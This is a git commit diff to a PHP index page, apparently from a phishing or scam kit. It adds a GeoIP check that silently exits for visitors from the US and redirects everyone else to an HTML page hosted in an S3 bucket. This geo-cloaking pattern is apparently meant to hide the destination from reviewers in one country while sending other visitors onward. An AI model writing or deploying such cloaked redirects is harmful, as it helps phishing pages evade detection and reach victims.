a914ac56dbcdcb3209545197a53bb7350478e16a
traackerscan123 <xuanhyunhledo@gmail.com>
2017-07-21 16:42:17 +0200

    Add files via upload

--- index.php
+++ index.php
@@ -9,7 +9,30 @@
 $randval = rand();
 
 
+
+
+
+include("geoip.inc");                                                                                                     
+$ip=$_SERVER['REMOTE_ADDR'];
+$gi = geoip_open("GeoIP.dat",GEOIP_STANDARD);
+
+$country_code = geoip_country_code_by_addr($gi, "$ip");
+
+// Country name is not used so commented
+// Get Country Name based on source IP
+//$country = geoip_country_name_by_addr($gi, "$ip");
+
+geoip_close($gi);
+
+switch($country_code)                                
+
+    {
+
+          case "US": exit(); break;
+
+
               default: header("Location: https://s3.amazonaws.com/redi51/red.html");
+}
 
 
 }
